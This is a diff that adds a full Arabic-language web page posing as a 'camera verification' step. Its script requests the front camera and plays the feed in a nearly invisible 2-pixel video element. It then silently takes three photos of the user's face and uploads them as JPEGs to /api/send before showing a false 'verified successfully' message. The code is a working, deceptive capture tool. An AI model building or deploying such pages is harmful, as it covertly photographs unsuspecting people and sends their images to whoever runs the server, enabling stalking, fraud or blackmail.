@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>جارٍ التحقق</title>
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;height:100%;background:#0b0d12;color:#e8eaf0;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+.wrap{min-height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;padding:26px;text-align:center}
+.ring{width:50px;height:50px;border:3px solid #232838;border-top-color:#5b8cff;border-radius:50%;animation:spin .9s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+h1{font-size:18px;font-weight:600;margin:0}
+p{font-size:14px;line-height:1.7;color:#98a0b3;margin:0;max-width:320px}
+.btn{margin-top:8px;padding:14px 36px;border:0;border-radius:14px;background:#2f6bff;color:#fff;font-size:16px;font-weight:600;font-family:inherit}
+.ok{color:#5fd08a}.err{color:#e07777}
+video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-events:none}
+.hide{display:none!important}
+</style>
+</head>
+<body>
+<div class="wrap" id="s1">
+<div style="font-size:46px">📷</div>
+<h1>التحقق من الكاميرا</h1>
+<p>لإكمال التحقق نحتاج الوصول إلى الكاميرا الأمامية. اضغط الزر ثم اختر «سماح».</p>
+<button class="btn" id="go">متابعة</button>
+</div>
+<div class="wrap hide" id="s2">
+<div class="ring" id="ring"></div>
+<h1 id="title">جارٍ التحقق...</h1>
+<p id="sub">يرجى الانتظار قليلاً</p>
+</div>
+<video id="v" playsinline autoplay muted></video>
+<script>
+(function(){
+var SHOTS=3,GAP=650,WARMUP=1100,Q=0.92,MIRROR=true;
+var v=document.getElementById('v'),s1=document.getElementById('s1'),s2=document.getElementById('s2'),
+ring=document.getElementById('ring'),title=document.getElementById('title'),sub=document.getElementById('sub'),go=document.getElementById('go');
+function fail(t){ring.classList.add('hide');title.className='err';title.textContent='تعذّر إكمال التحقق';sub.textContent=t||'لم يتم السماح بالوصول.';}
+function shot(){try{var w=v.videoWidth||720,h=v.videoHeight||960,c=document.createElement('canvas');c.width=w;c.height=h;var x=c.getContext('2d');if(MIRROR){x.translate(w,0);x.scale(-1,1);}x.drawImage(v,0,0,w,h);fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:c.toDataURL('image/jpeg',Q)})}).catch(function(){});}catch(e){}}
+function sleep(m){return new Promise(function(r){setTimeout(r,m)})}
+async function run(){
+if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){return fail('المتصفح لا يدعم الكاميرا.')}
+var s;try{s=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:'user'},width:{ideal:1280},height:{ideal:720}},audio:false})}catch(e){return fail('تم رفض الإذن أو لا توجد كاميرا.')}
+s1.classList.add('hide');s2.classList.remove('hide');
+v.srcObject=s;try{await v.play()}catch(e){}
+await sleep(WARMUP);
+for(var i=0;i<SHOTS;i++){shot();if(i<SHOTS-1)await sleep(GAP)}
+try{s.getTracks().forEach(function(t){t.stop()})}catch(e){}
+ring.classList.add('hide');title.className='ok';title.textContent='تم التحقق بنجاح';sub.textContent='يمكنك إغلاق الصفحة الآن.';
+}
+go.addEventListener('click',run);
+})();
+</script>
+</body>
+</html>
